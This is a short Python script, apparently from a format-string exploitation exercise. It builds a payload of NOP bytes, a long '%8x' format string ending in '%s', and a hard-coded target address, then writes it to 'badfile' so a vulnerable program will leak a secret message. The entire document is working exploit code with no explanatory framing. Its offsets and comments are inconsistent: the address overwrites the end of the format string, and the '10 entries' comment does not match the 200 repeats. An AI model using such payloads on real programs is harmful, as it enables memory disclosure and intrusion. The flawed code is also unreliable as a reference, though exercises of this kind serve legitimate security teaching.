#!/usr/bin/python3
import sys

# Address of the secret message
secret_msg_addr = 0x080af014

N = 1500

# Initialize payload with 1500 bytes
# content = bytearray(0x0 for _ in range(N))

# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# s = "%.8x x" * 746 + "%s\n"  # 10 entries + %s at 11th position
s = "%8x. x" * 200 + "%s\n"  # 10 entries + %s at 11th position
fmt = s.encode('latin-1')

offset=8

# Store the format string in the payload
content[offset:offset+len(fmt)] = fmt

# Place the secret message address at the end of the format string
addr_offset = len(fmt)
content[addr_offset:addr_offset+4] = (secret_msg_addr).to_bytes(4, byteorder='little')

# Write payload to badfile
with open('badfile', 'wb') as f:
    f.write(content)

# Output payload for testing
sys.stdout.buffer.write(content)
